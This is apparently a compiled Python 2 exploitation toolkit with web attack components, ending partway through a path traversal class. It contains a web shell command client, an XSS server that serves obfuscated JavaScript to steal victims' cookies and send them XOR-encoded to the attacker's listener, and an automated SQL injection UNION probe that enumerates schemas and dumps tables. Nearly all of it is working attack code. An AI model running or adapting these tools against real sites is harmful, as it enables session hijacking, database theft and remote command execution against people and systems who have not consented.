################################################################
# Compiled from Aphid to Python by Boxelder 0.5.5938.2265
# https://github.com/John-Leitch/Aphid/releases
################################################################
def var_func_00000032(___p_op_10):
    return (___p_op_10.filename)

def var_func_0000002E(___p_op_9):
    return (___p_op_9 > 1)

def var_func_0000001E(___p_op_6):
    return (___p_op_6 != "<")

def var_func_0000001D(___p_op_5):
    return (___p_op_5 != "#")

def where(predicate, list):
    x = []
    for element in list:
        if predicate(element):
            (x.append)(element)
    return x

def select(selector, list):
    x = []
    for y in list:
        (x.append)(selector(y))
    return x

def selectMany(selector, list):
    x = []
    for y in list:
        for z in selector(y):
            (x.append)(z)
    return x

def flatten(list):
    def var_func_00000000(x):
        return x

    return selectMany(var_func_00000000, list)

def any(predicate, list):
    for element in list:
        if predicate(element):
            return True
    return False

def all(predicate, list):
    for x in list:
        if not predicate(x):
            return False
    return True

def first(predicate, list):
    for x in list:
        if predicate(x):
            return x

def distinct(list):
    x = []
    for y in list:
        if not (x.__contains__)(y):
            (x.append)(y)
    return x

def iter(action, list):
    for x in list:
        action(x)

count = len
def concat(list, otherList):
    x = []
    for y in otherList:
        (x.append)(y)
    for y in list:
        (x.append)(y)
    return x

def skip(count, list):
    x = []
    i = 0
    for y in list:
        if (i >= count):
            (x.append)(y)
        i = (i + 1)
    return x

def take(count, list):
    x = []
    i = 0
    for y in list:
        if (i < count):
            (x.append)(y)
        i = (i + 1)
    return x

def aggr(acc, list):
    if (len(list) == 1):
        return list[0]
    else:
        s = list[0]
        for x in skip(1, list):
            s = acc(s, x)
        return s

def join(sep, list):
    def var_func_00000001(x, y):
        return ((x + sep) + y)

    return aggr(var_func_00000001, list)

def addAll(list):
    def var_func_00000002(x, y):
        return (x + y)

    return aggr(var_func_00000002, list)

import os.path
class File():
    @staticmethod
    def appendAllText(filename, text):
        (File.writeText)(filename, text, "a")

    @staticmethod
    def writeAllText(filename, text):
        (File.writeText)(filename, text, "w")

    @staticmethod
    def writeText(filename, text, mode):
        file = open(filename, mode)
        (file.write)(text)
        (file.close)()

    @staticmethod
    def readAllText(filename):
        file = open(filename, "r")
        r = (file.read)()
        (file.close)()
        return r

    @staticmethod
    def exists(filename):
        return ((os.path).isfile)(filename)


class CharRange():
    @staticmethod
    def __alpha(start):
        def var_func_00000003(___p_op_0):
            return (___p_op_0 + 26)

        return (lambda var_00000000:select(chr, var_00000000))(range(ord(start), var_func_00000003(ord(start))))

    @staticmethod
    def alphaLower():
        return (CharRange.__alpha)("a")

    @staticmethod
    def alphaUpper():
        return (CharRange.__alpha)("A")

    @staticmethod
    def alpha():
        return (lambda var_00000001:concat((CharRange.alphaUpper)(), var_00000001))((CharRange.alphaLower)())


import json
class JsonRepository():
    repo = None
    def __init__(self, filename):
        (self.filename) = filename
        if (self.exists)():
            (self.read)()
        else:
            (self.repo) = dict()

    def exists(self):
        return (File.exists)((self.filename))

    def read(self):
        (self.repo) = (json.loads)((File.readAllText)((self.filename)))
        if not isinstance((self.repo), dict):
            (self.repo) = dict()

    def write(self):
        (lambda var_00000002:(File.writeAllText)((self.filename), var_00000002))((json.dumps)((self.repo)))

    def add(self, key, obj):
        (self.repo)[key] = obj
        (self.write)()

    def __getitem__(self, key):
        return ((self.repo).get)(key)

    def __setitem__(self, key, value):
        (self.repo)[key] = value


class ExploitComponent():
    def log(self, message):
        print(message)

    @staticmethod
    def log(message):
        print(message)


import string
class HttpRequestTemplate():
    encode = True
    def __init__(self, url, query = None, post = None, file = None):
        (self.url) = url
        (self.query) = query
        (self.post) = post
        (self.file) = file

    def getUrl(self, values):
        s = ((((string.Template)((self.url)).substitute)(values)) if ((((self.url) != None) and (values != None))) else ((((self.url)) if (((self.url) != None)) else (""))))
        return ((((s + "?") + (self.getQuery)(values))) if ((self.hasQuery)()) else (s))

    def hasQuery(self):
        return (((self.query) != None) and (len((self.query)) != 0))

    def getQuery(self, values):
        return (self.__getData)((self.query), values)

    def getPost(self, values):
        return (self.__getData)((self.post), values)

    def getFile(self, values):
        def var_func_00000004(x):
            return HttpFile(((((string.Template)((x.name)).substitute)(values)) if ((((x.name) != None) and (values != None))) else ((((x.name)) if (((x.name) != None)) else ("")))), ((((string.Template)((x.filename)).substitute)(values)) if ((((x.filename) != None) and (values != None))) else ((((x.filename)) if (((x.filename) != None)) else ("")))), ((((string.Template)((x.data)).substitute)(values)) if ((((x.data) != None) and (values != None))) else ((((x.data)) if (((x.data) != None)) else ("")))), ((((string.Template)((x.type)).substitute)(values)) if ((((x.type) != None) and (values != None))) else ((((x.type)) if (((x.type) != None)) else ("")))))

        return ((None) if (((self.file) == None)) else ((lambda var_00000003:select(var_func_00000004, var_00000003))((self.file))))

    def __getData(self, data, values):
        if (data == None):
            return None
        result = dict()
        for k in data:
            result[((((string.Template)(k).substitute)(values)) if (((k != None) and (values != None))) else (((k) if ((k != None)) else (""))))] = ((((string.Template)(data[k]).substitute)(values)) if (((data[k] != None) and (values != None))) else (((data[k]) if ((data[k] != None)) else (""))))
        return (((urllib.urlencode)(result)) if ((self.encode)) else (result))


class HttpFile():
    def __init__(self, name, filename, data, type = "text/plain"):
        (self.name) = name
        (self.filename) = filename
        (self.data) = data
        (self.type) = type


import urllib2
from urllib import addinfourl
from urllib2 import HTTPRedirectHandler
class RedirectHandler(HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        x = addinfourl(fp, headers, (req.get_full_url)())
        (x.status) = code
        (x.code) = code
        return x

    http_error_300 = http_error_302
    http_error_301 = http_error_302
    http_error_303 = http_error_302
    http_error_307 = http_error_302

(urllib2.install_opener)((urllib2.build_opener)(RedirectHandler()))
from random import choice
class MultipartFormData():
    dispositionPrefix = "Content-Disposition: form-data; "
    typePrefix = "Content-Type: "
    multiPartPrefix = "multipart/form-data; boundary="
    def __init__(self):
        (self.boundary) = (self.createBoundary)()
        (self.data) = ""

    def createBoundary(self):
        def var_func_00000005(x):
            return choice((CharRange.alpha)())

        return (lambda var_00000004:join("", var_00000004))((lambda var_00000005:select(var_func_00000005, var_00000005))(range(0, 64)))

    def getBoundary(self, final = False):
        return ((("--" + (self.boundary)) + (("--") if (final) else (""))) + "\r\n")

    def addBoundary(self, final = False):
        (self.data) += (self.getBoundary)(final)

    def addDisposition(self, name, filename = None):
        (self.data) += (((self.dispositionPrefix) + ((("name=\"{}\"".format)(name)) if ((filename == None)) else (("name=\"{}\"; filename=\"{}\"".format)(name, filename)))) + "\r\n")

    def addType(self, type):
        (self.data) += (((self.typePrefix) + type) + "\r\n")

    def addLine(self, value = None):
        (self.data) += (((value) if ((value != None)) else ("")) + "\r\n")

    def addData(self, name, data):
        (self.addBoundary)()
        (self.addDisposition)(name)
        (self.addLine)()
        (self.addLine)(data)

    def addFileData(self, name, filename, type, data):
        (self.addBoundary)()
        (self.addDisposition)(name, filename)
        (self.addType)(type)
        (self.addLine)()
        (self.addLine)(data)

    def getContentType(self):
        return ((self.multiPartPrefix) + (self.boundary))

    def __str__(self):
        return ((self.data) + (self.getBoundary)(final = True))


from urlparse import parse_qs
class Http(ExploitComponent):
    contentType = "Content-Type"
    contentLength = "Content-Length"
    dataName = "name"
    dataFilename = "filename"
    dataType = "type"
    data = "data"
    @staticmethod
    def request(url, postData = None, fileData = None):
        print(("[?] %s" % url))
        if (postData != None):
            print(("    " + str(postData)))
        def var_func_00000006(x):
            return ("{{ {}, {}, {} }}".format)((x.name), (x.filename), (x.type))

        if (fileData != None):
            tup = (lambda var_00000006:join(", ", var_00000006))((lambda var_00000007:select(var_func_00000006, var_00000007))(fileData))
            print(("    " + tup))
        if (fileData == None):
            return ((urllib2.urlopen)(url, postData).read)()
        else:
            formData = (Http.createFormData)(postData, fileData)
            body = str(formData)
            req = (urllib2.Request)(url)
            (req.add_header)((Http.contentType), (formData.getContentType)())
            (req.add_header)((Http.contentLength), str(len(body)))
            (req.add_data)(body)
            return ((urllib2.urlopen)(req).read)()

    @staticmethod
    def createFormData(postData = None, fileData = None):
        formData = MultipartFormData()
        if (postData != None):
            postValues = parse_qs(postData)
            for k in (postValues.keys)():
                for v in postValues[k]:
                    (formData.addData)(k, v)
        if (fileData != None):
            for f in fileData:
                (formData.addFileData)((f.name), (f.filename), (f.type), (f.data))
        return formData


class Payload():
    def __init__(self, value):
        (self.value) = value

    def inject(self, target):
        return (((target % (self.value))) if ((target.__contains__)("%s")) else (target))

    def injectData(self, target):
        if (target == None):
            return None
        data = dict()
        for k in target:
            v = target[k]
            data[(self.inject)(k)] = (self.inject)(v)
        return data


class Injection():
    def __init__(self, begin, end, nextExpression):
        (self.begin) = begin
        (self.end) = end
        (self.nextExpression) = nextExpression

    def __str__(self):
        return (((self.begin) + (self.nextExpression)()) + (self.end))


from random import randint
class Shell(ExploitComponent):
    def __init__(self, createUrl, createPost = None):
        (self.createUrl) = createUrl
        (self.createPost) = createPost

    def run(self, cmd):
        u = (self.createUrl)(cmd)
        p = (((self.createPost)(cmd)) if (((self.createPost) != None)) else (None))
        resp = (Http.request)(u, p)
        return resp

    @staticmethod
    def get(url):
        def var_func_00000007(cmd):
            return ((url + "?") + (urllib.urlencode)({"cmd": cmd}))

        return Shell(var_func_00000007)

    @staticmethod
    def post(url):
        def var_func_00000008(cmd):
            return url

        def var_func_00000009(cmd):
            return (urllib.urlencode)({"cmd": cmd})

        return Shell(var_func_00000008, var_func_00000009)

    @staticmethod
    def open(url):
        (Shell.log)("[i] Detecting shell input")
        probe = str(randint(268435456, 4294967295))
        probeCmd = ("echo %s" % probe)
        for f in [(Shell.post), (Shell.get)]:
            try:
                shell = f(url)
                result = (shell.run)(probeCmd)
                if (result.__contains__)(probe):
                    (Shell.log)("[+] Shell input found")
                    return shell
            except (BaseException) as e:
                (Shell.log)(("[x] Request failed: %s" % e))
        (Shell.log)("[x] Could not find shell input")
        return None


class ExploitEncoding():
    key = [60, 159, 224, 114, 159, 230, 216, 94, 23, 190, 168, 12, 209, 198, 188, 191, 168, 255, 194, 242, 72, 124, 255, 231, 185, 153, 101, 80, 37, 111, 29, 106, 235, 199, 163, 78, 229, 209, 45, 102, 0, 23, 6, 208, 65, 8, 227, 181, 197, 44, 228, 1, 121, 189, 83, 192, 159, 248, 184, 5, 129, 136, 57, 167, 160, 62, 33, 9, 35, 109, 218, 214, 210, 92, 242, 49, 117, 47, 166, 177, 182, 175, 139, 248, 139, 27, 241, 46, 116, 226, 175, 237, 25, 39, 228, 120, 222, 94, 48, 3, 231, 217, 146, 88, 82, 13, 46, 28, 202, 34, 74, 112, 82, 7, 78, 209, 252, 64, 28, 132, 77, 242, 149, 64, 189, 236, 189, 170, 119, 122, 83, 23, 255, 162, 201, 221, 29, 51, 165, 125, 237, 212, 100, 81, 151, 63, 155, 17, 216, 19, 123, 157, 66, 171, 182, 245, 67, 81, 154, 102, 79, 131, 165, 80, 207, 51, 113, 175, 62, 113, 180, 201, 154, 158, 151, 120, 142, 67, 168, 126, 81, 172, 210, 100, 254, 181, 213, 83, 236, 212, 153, 203, 152, 63, 46, 105, 46, 19, 130, 100, 206, 235, 211, 103, 94, 178, 2, 163, 19, 61, 103, 0, 169, 28, 20, 163, 177, 65, 82, 25, 94, 29, 195, 105, 216, 233, 48, 91, 112, 45, 73, 122, 192, 68, 175, 101, 217, 106, 5, 76, 179, 49, 64, 174, 109, 153, 33, 124, 43, 138, 183, 237, 193, 105, 5, 177, 39, 105, 143, 116, 130, 167, 51, 229, 244, 236, 63, 100, 109, 174, 202, 71, 59, 5, 101, 44, 220, 21, 252, 63, 199, 180, 48, 229, 117, 92, 185, 87, 62, 254, 61, 111, 219, 144, 201, 12, 254, 90, 185, 128, 89, 189, 15, 124, 192, 112, 177, 187, 3, 216, 212, 18, 108, 80, 173, 206, 119, 77, 111, 151, 50, 231, 37, 110, 113, 90, 107, 170, 60, 89, 46, 130, 91, 123, 229, 10, 164, 180, 37, 5, 170, 253, 84, 102, 41, 43, 3, 138, 227, 251, 148, 177, 234, 34, 77, 114, 151, 160, 10, 102, 4, 7, 127, 169, 170, 82, 182, 240, 106, 162, 41, 195, 40, 106, 237, 53, 147, 191, 69, 69, 87, 224, 199, 64, 197, 125, 151, 57, 45, 115, 114, 4, 169, 191, 0, 163, 126, 170, 188, 215, 116, 18, 32, 64, 210, 209, 136, 128, 52, 24, 222, 216, 91, 196, 14, 35, 64, 62, 228, 44, 187, 125, 194, 247, 48, 36, 25, 105, 106, 73, 182, 233, 3, 109, 209, 68, 192, 134, 110, 243, 244, 22, 4, 21, 148, 154, 169, 228, 176, 220, 99, 63, 197, 143, 28, 246, 79, 40, 16, 173, 183, 31, 22, 235, 98, 245, 212, 237, 243, 202, 99, 185, 208, 241, 56, 164, 121, 173, 98, 149, 123, 53, 184, 141, 230, 119, 35, 115, 81, 218, 244, 152, 117, 193, 59, 212, 0, 25, 178, 159, 197, 187, 240, 230, 121, 169, 111, 212, 86, 119, 125, 161]
    @staticmethod
    def decode(value):
        i = 0
        decoded = ""
        for x in value:
            decoded += chr((ord(x) ^ (ExploitEncoding.key)[i]))
            i = (i + 1)
            if (i == len((ExploitEncoding.key))):
                i = 0
        return decoded


from urlparse import urlparse, parse_qs
from BaseHTTPServer import BaseHTTPRequestHandler
class ExploitRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        uri = urlparse((self.path))
        rsrc = (self.getFile)((uri.path))
        query = parse_qs((uri.query))
        print(("[i] Path: %s" % (self.path)))
        print(("[i] Resource: %s" % rsrc))
        print(("[i] Referer: %s" % (self.getReferer)()))
        print(("[i] IP: {}:{}".format)((self.getIP)(), (self.getPort)()))
        hasContent = ((rsrc != None) and (rsrc != ""))
        if ((query != None) and (query != "")):
            (self.handleQuery)()
        else:
            if hasContent:
                (self.handleResource)()
        code = ((200) if ((((uri.query) != "") or hasContent)) else (404))
        (self.send_response)(code)
        (self.send_header)("Access-Control-Allow-Origin", "*")
        (self.end_headers)()
        if hasContent:
            ((self.wfile).write)(rsrc)
        print("")

    def log_message(self, a = None, b = None, c = None, d = None, e = None, f = None, g = None, h = None, i = None, j = None, k = None, l = None, m = None, n = None, o = None, p = None):
        0

    def handleQuery(self):
        print(("[i] Message: %s" % (self.getMsg)()))

    def handleResource(self, rsrc):
        (self.send_header)("Content-type", "text/javascript")

    def getIP(self):
        return (self.client_address)[0]

    def getPort(self):
        return (self.client_address)[1]

    def getUrl(self):
        return urlparse((self.path))

    def getQuery(self):
        return parse_qs(((self.getUrl)().query))

    def getMsg(self):
        q = (self.getQuery)()
        keys = (q.keys)()
        return (((ExploitEncoding.decode)(q[keys[0]][0])) if ((len(keys) != 0)) else (None))

    def getReferer(self):
        def var_func_0000000A(r):
            return ((r[0]) if ((len(r) != 0)) else (None))

        return var_func_0000000A(((self.headers).getheaders)("referer"))

    def getFile(self, path):
        if (len(path) == 0):
            return None
        name = path[1:]
        text = (((self.server).payloads).get)(name)
        return text


class ExploitResource():
    @staticmethod
    def getScriptTag(host, port, name):
        return ("<script src=\"http://{}{}/{}\" type=\"text/javascript\"></script>".format)(host, (((":" + str(port))) if (((port != None) and (port != ""))) else ("")), name)

    @staticmethod
    def getJsCookieStealer(host, port):
        return (("\r\n        // Todo: generate key and store in repo\r\n        var key = [0x3C,0x9F,0xE0,0x72,0x9F,0xE6,0xD8,0x5E,0x17,0xBE,0xA8,0x0C,0xD1,0xC6,0xBC,0xBF,0xA8,0xFF,0xC2,0xF2,0x48,0x7C,0xFF,0xE7,0xB9,0x99,0x65,0x50,0x25,0x6F,0x1D,0x6A,0xEB,0xC7,0xA3,0x4E,0xE5,0xD1,0x2D,0x66,0x00,0x17,0x06,0xD0,0x41,0x08,0xE3,0xB5,0xC5,0x2C,0xE4,0x01,0x79,0xBD,0x53,0xC0,0x9F,0xF8,0xB8,0x05,0x81,0x88,0x39,0xA7,0xA0,0x3E,0x21,0x09,0x23,0x6D,0xDA,0xD6,0xD2,0x5C,0xF2,0x31,0x75,0x2F,0xA6,0xB1,0xB6,0xAF,0x8B,0xF8,0x8B,0x1B,0xF1,0x2E,0x74,0xE2,0xAF,0xED,0x19,0x27,0xE4,0x78,0xDE,0x5E,0x30,0x03,0xE7,0xD9,0x92,0x58,0x52,0x0D,0x2E,0x1C,0xCA,0x22,0x4A,0x70,0x52,0x07,0x4E,0xD1,0xFC,0x40,0x1C,0x84,0x4D,0xF2,0x95,0x40,0xBD,0xEC,0xBD,0xAA,0x77,0x7A,0x53,0x17,0xFF,0xA2,0xC9,0xDD,0x1D,0x33,0xA5,0x7D,0xED,0xD4,0x64,0x51,0x97,0x3F,0x9B,0x11,0xD8,0x13,0x7B,0x9D,0x42,0xAB,0xB6,0xF5,0x43,0x51,0x9A,0x66,0x4F,0x83,0xA5,0x50,0xCF,0x33,0x71,0xAF,0x3E,0x71,0xB4,0xC9,0x9A,0x9E,0x97,0x78,0x8E,0x43,0xA8,0x7E,0x51,0xAC,0xD2,0x64,0xFE,0xB5,0xD5,0x53,0xEC,0xD4,0x99,0xCB,0x98,0x3F,0x2E,0x69,0x2E,0x13,0x82,0x64,0xCE,0xEB,0xD3,0x67,0x5E,0xB2,0x02,0xA3,0x13,0x3D,0x67,0x00,0xA9,0x1C,0x14,0xA3,0xB1,0x41,0x52,0x19,0x5E,0x1D,0xC3,0x69,0xD8,0xE9,0x30,0x5B,0x70,0x2D,0x49,0x7A,0xC0,0x44,0xAF,0x65,0xD9,0x6A,0x05,0x4C,0xB3,0x31,0x40,0xAE,0x6D,0x99,0x21,0x7C,0x2B,0x8A,0xB7,0xED,0xC1,0x69,0x05,0xB1,0x27,0x69,0x8F,0x74,0x82,0xA7,0x33,0xE5,0xF4,0xEC,0x3F,0x64,0x6D,0xAE,0xCA,0x47,0x3B,0x05,0x65,0x2C,0xDC,0x15,0xFC,0x3F,0xC7,0xB4,0x30,0xE5,0x75,0x5C,0xB9,0x57,0x3E,0xFE,0x3D,0x6F,0xDB,0x90,0xC9,0x0C,0xFE,0x5A,0xB9,0x80,0x59,0xBD,0x0F,0x7C,0xC0,0x70,0xB1,0xBB,0x03,0xD8,0xD4,0x12,0x6C,0x50,0xAD,0xCE,0x77,0x4D,0x6F,0x97,0x32,0xE7,0x25,0x6E,0x71,0x5A,0x6B,0xAA,0x3C,0x59,0x2E,0x82,0x5B,0x7B,0xE5,0x0A,0xA4,0xB4,0x25,0x05,0xAA,0xFD,0x54,0x66,0x29,0x2B,0x03,0x8A,0xE3,0xFB,0x94,0xB1,0xEA,0x22,0x4D,0x72,0x97,0xA0,0x0A,0x66,0x04,0x07,0x7F,0xA9,0xAA,0x52,0xB6,0xF0,0x6A,0xA2,0x29,0xC3,0x28,0x6A,0xED,0x35,0x93,0xBF,0x45,0x45,0x57,0xE0,0xC7,0x40,0xC5,0x7D,0x97,0x39,0x2D,0x73,0x72,0x04,0xA9,0xBF,0x00,0xA3,0x7E,0xAA,0xBC,0xD7,0x74,0x12,0x20,0x40,0xD2,0xD1,0x88,0x80,0x34,0x18,0xDE,0xD8,0x5B,0xC4,0x0E,0x23,0x40,0x3E,0xE4,0x2C,0xBB,0x7D,0xC2,0xF7,0x30,0x24,0x19,0x69,0x6A,0x49,0xB6,0xE9,0x03,0x6D,0xD1,0x44,0xC0,0x86,0x6E,0xF3,0xF4,0x16,0x04,0x15,0x94,0x9A,0xA9,0xE4,0xB0,0xDC,0x63,0x3F,0xC5,0x8F,0x1C,0xF6,0x4F,0x28,0x10,0xAD,0xB7,0x1F,0x16,0xEB,0x62,0xF5,0xD4,0xED,0xF3,0xCA,0x63,0xB9,0xD0,0xF1,0x38,0xA4,0x79,0xAD,0x62,0x95,0x7B,0x35,0xB8,0x8D,0xE6,0x77,0x23,0x73,0x51,0xDA,0xF4,0x98,0x75,0xC1,0x3B,0xD4,0x00,0x19,0xB2,0x9F,0xC5,0xBB,0xF0,0xE6,0x79,0xA9,0x6F,0xD4,0x56,0x77,0x7D,0xA1];\r\n        \r\n        var alphaNum = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\r\n        var nextInt = function(max) { return Math.floor(Math.random() * max); };\r\n        var nextChar = function() { return alphaNum[nextInt(alphaNum.length)]; };\r\n        \r\n        var nextName = function() {\r\n            var len = nextInt(0x10);\r\n            var name = \"\";\r\n            for (var i = 0; i < len; i++) name += nextChar();\r\n            \r\n            return name;\r\n        };\r\n        \r\n        var applyKey = function(value, key, apply) {\r\n            var keyIndex = 0;\r\n            var applied = \"\";\r\n            \r\n            for (var i = 0; i < value.length; i++) {\r\n                applied += apply(value.charCodeAt(i), key[keyIndex]);\r\n                if (++keyIndex == key.length) keyIndex = 0;\r\n            }\r\n            \r\n            return applied;\r\n        };\r\n        \r\n        var encode = function(value, key) {\r\n            return applyKey(value, key, function(v, k) {\r\n                return String.fromCharCode(v ^ k);\r\n            });            \r\n        };\r\n    \r\n        var xhr = window.XMLHttpRequest ? \r\n            new XMLHttpRequest() : \r\n            new ActiveXObject(\"Microsoft.XMLHTTP\");\r\n            \r\n        var sendValue = function(v) {\r\n            var k = nextName();\r\n            var qs = k + \"=\" + escape(encode(v, key));\r\n            xhr.open(\"GET\", \"http://{host}:{port}/?\" + qs, true);\r\n            xhr.onreadystatechange = function (e) {\r\n                if (xhr.readyState == 4 && xhr.status != 200) {\r\n                    console.log(xhr.statusText);\r\n                }\r\n            }; \r\n            xhr.send();            \r\n        };\r\n        \r\n        try {\r\n            sendValue(\"Cookie => \" + document.cookie);\r\n        } catch (err) { alert(err); }\r\n    ".replace)("{host}", host).replace)("{port}", str(port))


from random import randint, choice
from BaseHTTPServer import HTTPServer
class ExploitServerConfig():
    portKey = "port"
    cookieStealerKey = "cookieStealer"
    alpha = (CharRange.alpha)()
    serverRepo = JsonRepository("server.json")
    @staticmethod
    def nextPort():
        return randint(49152, 65535)

    @staticmethod
    def nextName():
        def var_func_0000000B(x):
            return choice((ExploitServerConfig.alpha))

        return (lambda var_00000008:join("", var_00000008))((lambda var_00000009:select(var_func_0000000B, var_00000009))(range(0, randint(4, 16))))

    @staticmethod
    def getPort():
        def var_func_0000000C():
            return (ExploitServerConfig.serverRepo)[(ExploitServerConfig.portKey)]

        return (ExploitServerConfig.getValue)(var_func_0000000C)

    @staticmethod
    def getCookieStealer():
        def var_func_0000000D():
            return (ExploitServerConfig.serverRepo)[(ExploitServerConfig.cookieStealerKey)]

        return (ExploitServerConfig.getValue)(var_func_0000000D)

    @staticmethod
    def getValue(f):
        (ExploitServerConfig.ensure)()
        return f()

    @staticmethod
    def ensure():
        if ((ExploitServerConfig.serverRepo)[(ExploitServerConfig.portKey)] == None):
            (ExploitServerConfig.generate)()

    @staticmethod
    def generate():
        (ExploitServerConfig.serverRepo)[(ExploitServerConfig.portKey)] = (ExploitServerConfig.nextPort)()
        (ExploitServerConfig.serverRepo)[(ExploitServerConfig.cookieStealerKey)] = (ExploitServerConfig.nextName)()
        ((ExploitServerConfig.serverRepo).write)()


class XssExploit():
    def __init__(self, server, tmpl):
        (self.server) = server
        (self.tmpl) = tmpl

    def __str__(self):
        if (((tmpl.post) != None) and (len((tmpl.post)) > 0)):
            print("[X] POST XSS not yet supported")
            quit()
        return (tmpl.getUrl)({"xss": ((self.server).scriptTag)})


class ExploitServer(ExploitComponent):
    port = (ExploitServerConfig.getPort)()
    cookieStealer = (ExploitServerConfig.getCookieStealer)()
    def __init__(self, ip):
        (self.ip) = ip
        endpoint = (self.ip), (self.port)
        (self.server) = HTTPServer(endpoint, ExploitRequestHandler)
        ((self.server).payloads) = dict()
        ((self.server).payloads)[(self.cookieStealer)] = (ExploitResource.getJsCookieStealer)((self.ip), (self.port))
        (self.scriptTag) = (ExploitResource.getScriptTag)((self.ip), (self.port), (self.cookieStealer))

    def createExploit(self, tmpl):
        return str(XssExploit(self, tmpl))

    def serveForever(self):
        (self.log)(("[?] Listening on {}:{}".format)((self.ip), (self.port)))
        ((self.server).serve_forever)()


class SqlEmitter():
    alpha = (CharRange.alpha)()
    def getChars(self):
        def var_func_0000000E(___p_op_1):
            return (___p_op_1 != (self.quote)())

        return (lambda var_0000000A:select(chr, var_0000000A))((lambda var_0000000B:where(var_func_0000000E, var_0000000B))(range(32, 128)))

    def tup(self, vals):
        def var_func_0000000F(x, y):
            return (((x + ",") + (self.space)()) + y)

        return (lambda var_0000000C:aggr(var_func_0000000F, var_0000000C))(vals)

    def words(self, words):
        def var_func_00000010(x, y):
            return ((x + (self.space)()) + y)

        return (lambda var_0000000D:aggr(var_func_00000010, var_0000000D))(words)

    def space(self):
        return " "

    def quote(self):
        return "'"

    def junkChars(self, min, max):
        def var_func_00000011(x):
            return choice((self.alpha))

        return (lambda var_0000000E:join("", var_0000000E))((lambda var_0000000F:select(var_func_00000011, var_0000000F))((lambda var_00000010:range(0, var_00000010))(randint(min, max))))

    def junkString(self, min, max):
        return (self.string)((self.junkCharRange)(min, max))

    def unionAll(self, cols):
        return (self.words)(["UNION", "SELECT", "ALL", (self.tup)(cols)])

    def binExp(self, lhs, op, rhs):
        return ("{0}{1}{2}".format)(lhs, op, rhs)

    def add(self, lhs, rhs):
        return (self.binExp)(lhs, "+", rhs)

    def concat(self, lhs, rhs):
        return ("CONCAT({0},{1})".format)(lhs, rhs)

    def string(self, body):
        return ("{1}{0}{1}".format)(body, (self.quote)())

    def comment(self):
        return "#"


class SqlProbeExpression():
    def __init__(self, exp, result):
        (self.exp) = exp
        (self.result) = result


class SqlUnionOutputInfo():
    def __init__(self, begin, end, columnCount, columnNumber):
        (self.begin) = begin
        (self.end) = end
        (self.columnCount) = columnCount
        (self.columnNumber) = columnNumber


class SqlUnionProbe(ExploitComponent):
    emitter = SqlEmitter()
    output = None
    begins = ["'", "\"", "-1 ", "0 ", ""]
    ends = ["#", "--", ""]
    def __init__(self, httpTemplate, maxColumns = 32):
        (self.httpTemplate) = httpTemplate
        (self.maxColumns) = maxColumns

    def number(self):
        return randint(4096, 65536)

    def exp(self):
        junk = ((self.emitter).junkChars)(4, 8)
        x = (self.number)()
        y = (self.number)()
        exp = ((self.emitter).concat)(((self.emitter).string)(junk), ((self.emitter).add)(x, y))
        return SqlProbeExpression(exp, (junk + str((x + y))))

    def findOutput(self):
        (self.emitter) = SqlEmitter()
        columns = 0
        (self.log)("[?] Searching for union count and output")
        def var_func_00000012(x):
            return (self.exp)()

        def var_func_00000013(___p_op_2):
            return (___p_op_2.exp)

        def var_func_00000014(___p_op_3):
            return (___p_op_3.result)

        def var_func_00000015(___p_op_4):
            return (___p_op_4 != 0)

        while True:
            columns = (columns + 1)
            for begin in (self.begins):
                for end in (self.ends):
                    colExps = (lambda var_00000011:select(var_func_00000012, var_00000011))(range(0, columns))
                    cols = (lambda var_00000012:select(var_func_00000013, var_00000012))(colExps)
                    colVals = (lambda var_00000013:select(var_func_00000014, var_00000013))(colExps)
                    resp = (self.sendRequest)((self.createInjection)(begin, end, cols))
                    matches = (lambda var_00000014:where((resp.__contains__), var_00000014))(colVals)
                    if var_func_00000015(len(matches)):
                        offset = (colVals.index)(matches[0])
                        msg = ("\r\n[+] Output found: Begin={}, End={}, Columns={}, Offset={}\r\n".format)(begin, end, columns, offset)
                        (self.log)(msg)
                        return SqlUnionOutputInfo(begin, end, columns, offset)
            if (columns >= (self.maxColumns)):
                return None

    def inject(self, columns, table, where = None):
        def hasOutput():
            return ((self.output) != None)

        if not hasOutput():
            (self.output) = (self.findOutput)()
        if not hasOutput():
            (self.log)("[X] Could not find output for injection\r\n")
            return None
        injector = SqlUnionInjector({"HOST": "localhost", "PORT": 80}, ((self.output).columnCount), ((self.output).columnNumber), columns, table, delimiter = ((self.output).begin), where = where, terminator = ((self.output).end))
        (injector.payload) = (injector.dump)
        resp = (self.sendRequest)((injector.str)())
        return (injector.finalize)(resp)

    def parseSchema(self, schemas):
        if (schemas == None):
            return None
        def var_func_00000016(x):
            return x[0]

        d = distinct((lambda var_00000015:select(var_func_00000016, var_00000015))(schemas))
        dbs = dict()
        def var_func_00000017(y):
            return y[1]

        def var_func_00000018(y):
            return (x == y[0])

        for x in d:
            dbs[x] = (lambda var_00000016:select(var_func_00000017, var_00000016))((lambda var_00000017:where(var_func_00000018, var_00000017))(schemas))
        return dbs

    def listSchemas(self):
        return (self.parseSchema)((self.inject)(["TABLE_SCHEMA", "TABLE_NAME"], "INFORMATION_SCHEMA.Tables"))

    def listColumns(self, schema, table):
        (self.log)("[?] Querying information schema for column names")
        whereTmpl = (" WHERE INFORMATION_SCHEMA.COLUMNS.TABLE_SCHEMA = '{0}' AND" + " INFORMATION_SCHEMA.COLUMNS.TABLE_NAME='{1}'")
        cols = (self.inject)(["COLUMN_NAME"], "INFORMATION_SCHEMA.COLUMNS", where = (whereTmpl.format)(schema, table))
        if (cols == None):
            (self.log)("[X] Could not query information schema\r\n")
            return None
        def var_func_00000019(x):
            return x[0]

        cols = (lambda var_00000018:select(var_func_00000019, var_00000018))(cols)
        def var_func_0000001A(x):
            return (("[" + x) + "]")

        tup = (lambda var_00000019:join(", ", var_00000019))((lambda var_0000001A:select(var_func_0000001A, var_0000001A))(cols))
        (self.log)(("\r\n[+] Columns found: %s\r\n" % tup))
        return cols

    def dumpTable(self, table, schema = None, columns = None):
        return (self.inject)((((self.listColumns)(schema, table)) if ((schema != None)) else (columns)), table)

    def sendRequest(self, injection):
        values = {"sqli": injection}
        return (Http.request)(((self.httpTemplate).getUrl)(values), ((self.httpTemplate).getPost)(values))

    def createInjection(self, begin, end, cols):
        def var_func_0000001B():
            return ((self.emitter).unionAll)(cols)

        return Injection(begin, end, var_func_0000001B)


class TraversalRange(ExploitComponent):
    def __init__(self, files, start, stop, dot = ".", separator = "/", terminator = ""):
        (self.files) = files
        (self.start) = start
        (self.stop) = stop
        (self.dot) = dot
        (self.separator) = separator
